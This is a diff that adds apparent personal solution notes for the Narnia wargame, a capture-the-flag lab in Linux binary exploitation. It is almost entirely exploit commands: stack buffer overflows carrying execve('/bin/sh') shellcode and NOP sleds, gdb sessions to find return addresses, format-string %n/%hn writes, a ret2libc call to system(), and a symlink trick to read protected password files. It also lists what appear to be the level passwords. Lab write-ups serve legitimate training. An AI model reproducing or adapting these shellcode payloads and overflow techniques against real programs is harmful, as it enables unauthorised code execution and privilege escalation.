@@ -1,0 +1,204 @@
+python -c 'print("A"*40 + "\xef\xbe\xad\xde")' | ./ch13
+
+
+/narnia -> /games/narnia
+
+
+
+python -c 'print("A"*20 + "\xef\xbe\xad\xde")' | 
+
+
+Narnia0
+
+(python -c 'print("A"*20 + "\xef\xbe\xad\xde")';cat ) | /games/narnia/narnia0
+
+
+narnia1
+efeidiedae
+
+narnia2
+
+more /narnia/narnia1.c
+export EGG="more /etc/narnia_pass/narnia2"
+
+export EGG=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
+export EGG=$(python -c 'print "\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"')
+
+nairiepecu
+
+
+
+narnia3
+
+**./narnia2 $(python -c 'print("\x90"*1110 + "\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68")')
+**dmesg | tail -10
+
+gdb -q /narnia/narnia2
+r $(python -c 'print("\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "AAAA")') 
+Test the bufferoverflow and see the result stack :
+x/300x $esp
+r $(python -c 'print("\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x40\xd8\xff\xff")')
+
+
+Gain access :
+/narnia/narnia2 $(python -c 'print("\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x40\xd8\xff\xff")')
+0xffffd8b0
+
+narnia3
+vaequeezee
+
+
+narnia4
+		|----32Bytes Buffer Overflow---|
+narnia3@melinda:/tmp/nehti3/BBBBBBBBBBBBBBBBBBBB/tmp$ ln -s /etc/narnia_pass/narnia4 ./testln
+narnia3@melinda:/tmp/nehti3/BBBBBBBBBBBBBBBBBBBB/tmp$ touch /tmp/testln
+narnia3@melinda:/tmp/nehti3/BBBBBBBBBBBBBBBBBBBB/tmp$ chmod 777 /tmp/testln
+narnia3@melinda:/tmp/nehti3/BBBBBBBBBBBBBBBBBBBB/tmp$ /narnia/narnia3 $(python -c 'print("/tmp/nehti3/BBBBBBBBBBBBBBBBBBBB"+"/tmp/testln")')
+copied contents of /tmp/nehti3/BBBBBBBBBBBBBBBBBBBB/tmp/testln to a safer place... (/tmp/testln)
+narnia3@melinda:/tmp/nehti3/BBBBBBBBBBBBBBBBBBBB/tmp$ cat testln
+cat: testln: Permission denied
+narnia3@melinda:/tmp/nehti3/BBBBBBBBBBBBBBBBBBBB/tmp$ ls
+mabite  nehti3  testln
+narnia3@melinda:/tmp/nehti3/BBBBBBBBBBBBBBBBBBBB/tmp$ cat /tmp/testln
+thaenohtai
+
+
+
+thaenohtai
+
+narnia5
+
+gdb -q /narnia/narnia4
+run $(python -c 'print("A"*300 )')
+x/250x $esp
+
+/games/narnia/narnia4 $(python -c 'print("\x90"*247+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x10\xd8\xff\xff" )')
+/games/narnia/narnia4 $(python -c'print "\x90"*247 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x10\xd8\xff\xff"')
+$ cat /etc/narnia_pass/narnia5
+**********
+
+
+faimahchiy
+
+narnia6
+neezocaeng
+
+gdb -q /narnia/narnia5
+run $(python -c 'print "AAA0_%08x.%08x.%08x.%08x.%08x.%n"')
+run $(python -c 'print "%s%s%s%s%s%s%s%s%n"')
+
+
+/narnia/narnia5 AAAA%x%x%x%x%x%x%x%x
+run $(python -c 'print "AAAA%x%x%x%x%x%x%x%x"')
+run $(python -c 'print "AAAA%p%p%p%p%p%p%p%p"')
+
+b *0x080484e9
+run $(python -c 'print "AAAAAAAAAAAAAAAAAAAAAAA%x%x%x%x%x%x%x%x"')
+x/50wx $esp
+First AAAA Bytes : 0xffffd690
+i value  0xffffd6a0 -> 0xffffd6ac -> \xac\xd6\xff\xff
+run $(python -c 'print "\xac\xd6\xff\xff%p%p%p%p%p%p%p%p"')
+
+
+/games/narnia/narnia5 $(python -c 'print "\xbc\xd6\xff\xff"')%p%p%p%466u%n
+
+neezocaeng
+
+
+narnia7
+
+
+0xffffd65c -> 0xffffd668 -> \x68\xd6\xff\xff
+
+/games/narnia/narnia4 $(python -c 'print("\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x68\xd6\xff\xff" )')
+
+run $(python -c 'print("\x68\xd6\xff\xff"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" )')
+
+
+
+0xffffd6ac
+
+run BBBB $(python -c 'print("\x90"*16 + "\x6c\xd6\xff\xff" + "\x90"*50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")')
+/games/narnia/narnia6 BBBB $(python -c 'print("\x90"*16 + "\x70\xd6\xff\xff" + "\x90"*50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")')
+
+r BBBB $(python -c 'print("\x90"*16 +  "\x90"*50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x70\xd6\xff\xff")')
+
+
+
+r AAAAAAAA $(python -c 'print( "G"*8 )')
+/narnia/narnia6 BBBBBBBBBBBBBBBB $(python -c 'print("\x90"*16 + "\x60\xd6\xff\xff"+"\x90"*50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")')
+
+r  BBBBBBBB $(python -c 'print("\x6a\x86\x04\x08")') AAAAAAAA/bin/sh
+
+
+
+gdb -q /narnia/narnia6
+break main
+run un test
+break system -----> 
+
+As soon as the breakpoint on main() is hit, the stdlib.h would’ve been loaded which means 
+I would be able to put a breakpoint on the system() 
+function and identify the memory address that way.
+Afin de trouver l'adresse du syscall system() pour lui faire passer en argument le /bin/sh afin qu'il s'execute.
+
+(gdb) b system
+Breakpoint 2 at 0xf7e61e70 -> address of the system function.
+
+		8Bytes 1er buffer		écraser l'EIP avec |   8Bytes 1er buffer+Program to launch
+/games/narnia/narnia6 BBBBBBBB$(python -c 'print("\x70\x1e\xe6\xf7")') AAAAAAAA/bin/sh
+
+
+
+
+
+ahkiaziphu
+
+
+
+narnia8
+
+
+in vuln : change ptrf = goodfunction; by @ of hackedfunction
+
+SEGFault
+r $(python -c 'print("%s"*10)')
+
+ptrf disas :
+0x0804861c
+0x80486e0
+before : ptrf() = 0x80486e0 (0xffffd62c)
+
+0xf7e69c2c
+Template : 
+[addr + 2][addr]    =       \x7e\xd6\xff\xff\x7c\xd6\xff\xff
+%.[HOB - 8]x        =       0x0804 - 8 = 7FC (2044) = %.2044x
+%[offset]$hn        =       %6\$hn
+%.[LOB - HOB]x      =       0x8695 - 0804 = 7E91 (32401) = %.32401x
+%[offset + 1]$hn    =       %7\$hn
+
+
+HOB : 0804
+LOB : 8706
+addr : 0xffffd63c
+
+[addr + 2][addr]    =       \x3e\xd6\xff\xff\x3c\xd6\xff\xff
+%.[HOB - 8]x        =       0x0804 - 8 = 7FC (2044) = %.2044x
+%[offset]$hn        =       %6\$hn
+%.[LOB - HOB]x      =       0x8706 - 0804 = 7F02 (32514) = %.32514x
+%[offset + 1]$hn    =       %7\$hn
+
+
+
+$(python -c'print("\x3e\xd6\xff\xff\x3c\xd6\xff\xff")')%.2044x%6\$hn%.32514x%7\$hn
+
+
+mohthuphog
+
+narnia9
+
+r $(python -c 'print("A"*50)')
+
+0xffffd8a0
+r $(python -c 'print("A"*20 + "\xa0\xd8\xff\xff" + "\x90"*50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")')
+
